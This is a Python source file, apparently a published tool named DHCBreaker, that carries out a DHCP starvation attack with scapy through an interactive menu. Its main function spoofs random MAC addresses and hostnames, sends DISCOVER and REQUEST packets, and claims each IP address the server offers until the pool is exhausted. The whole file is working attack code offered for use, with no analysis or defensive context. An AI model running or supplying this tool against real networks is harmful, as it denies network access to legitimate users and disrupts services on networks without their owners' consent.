
import pyfiglet
from colorama import Fore, Style
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, conf
from scapy.utils import mac2str
import random
import string
import time

def show_banner():
    text = "DHCP STARVATION"
    text_dhcp = pyfiglet.figlet_format(text, font="slant", width=200)
    print(f"{Fore.LIGHTRED_EX}{text_dhcp}{Style.RESET_ALL}")

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0xff) for _ in range(5))

def random_hostname(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def dhcp_filter(pkt):
    return pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 2

def list_interfaces():
    print(f"{Fore.MAGENTA}[!] Available Network Interfaces:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'Index':<6}{'Name':<40}{'MAC':<20}{'IPv4':<18}{'IPv6'}{Style.RESET_ALL}")
    print("-" * 100)
    interfaces = []
    for index, iface in enumerate(conf.ifaces.values(), start=1):
        mac = iface.mac if iface.mac else "N/A"
        ipv4 = iface.ip if iface.ip else "N/A"
        print(f"{Fore.YELLOW}{index:<6}{iface.name:<40}{mac:<20}{ipv4:<18}{Style.RESET_ALL}")
        interfaces.append((index, iface.name))
    print("\n")
    return interfaces

def dhcp_starvation(interface, count):
    print(f"{Fore.YELLOW}[+] Start Attack DHCP Starvation on {interface} | {count} Requests{Style.RESET_ALL}")
    for i in range(count):
        fake_mac = random_mac()
        fake_hostname = random_hostname()

        dhcp_discover = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
                        IP(src="0.0.0.0", dst="255.255.255.255") / \
                        UDP(sport=68, dport=67) / \
                        BOOTP(chaddr=[mac2str(fake_mac)]) / \
                        DHCP(options=[("message-type", "discover"), ("hostname", fake_hostname), "end"])

        sendp(dhcp_discover, iface=interface, verbose=False)
        print(f"{Fore.GREEN}[+] Request {i+1}/{count} || Sent from MAC: {fake_mac} || Hostname: {fake_hostname}{Style.RESET_ALL}")

        offer = sniff(filter="udp and (port 67 or port 68)", iface=interface, stop_filter=dhcp_filter, timeout=5)
        if offer:
            offered_ip = offer[0][BOOTP].yiaddr
            print(f"{Fore.CYAN}[+] IP received: {offered_ip}{Style.RESET_ALL}")
            dhcp_request = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
                           IP(src="0.0.0.0", dst="255.255.255.255") / \
                           UDP(sport=68, dport=67) / \
                           BOOTP(chaddr=[mac2str(fake_mac)], ciaddr="0.0.0.0") / \
                           DHCP(options=[("message-type", "request"), ("requested_addr", offered_ip), ("hostname", fake_hostname), "end"])
            sendp(dhcp_request, iface=interface, verbose=False)
            print(f"{Fore.BLUE}[+] IP verification request sent for {offered_ip}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] No response received!{Style.RESET_ALL}")
        time.sleep(0.2)

def show_about():
    print(f"""
{Fore.CYAN}
    [+] Author : moein.nrz
    [+] Project : DHCP Starvation (DHCBreaker)
    [+] GitHub : https://github.com/moeinnrz
    [+] Email  : moein.nrz.dev@gmail.com
{Style.RESET_ALL}
    """)

def main_menu():
    while True:
        show_banner()
        print(f"""
{Fore.YELLOW}Main Menu:{Style.RESET_ALL}
  1. Start DHCP Starvation Attack
  2. About Me
  Press Ctrl+Esc or Ctrl+C anytime to return to this menu.
        """)
        try:
            choice = input(f"{Fore.CYAN}[?] Select Option: {Style.RESET_ALL}").strip()
            if choice == "1":
                interfaces = list_interfaces()
                while True:
                    try:
                        selected_index = int(input(f"{Fore.CYAN}[?] Select Network Interface Index: {Style.RESET_ALL}"))
                        interface = next(iface[1] for iface in interfaces if iface[0] == selected_index)
                        break
                    except (ValueError, StopIteration):
                        print(f"{Fore.RED}[-] Invalid selection! Please enter a valid index.{Style.RESET_ALL}")
                count = int(input(f"{Fore.CYAN}[?] Enter Number of Requests: {Style.RESET_ALL}"))
                dhcp_starvation(interface, count)
            elif choice == "2":
                show_about()
                input(f"{Fore.YELLOW}[!] Press Enter to return to main menu...{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Invalid option!{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print(f"\n{Fore.LIGHTRED_EX}[!] Returning to main menu...{Style.RESET_ALL}")

if __name__ == "__main__":
    main_menu()
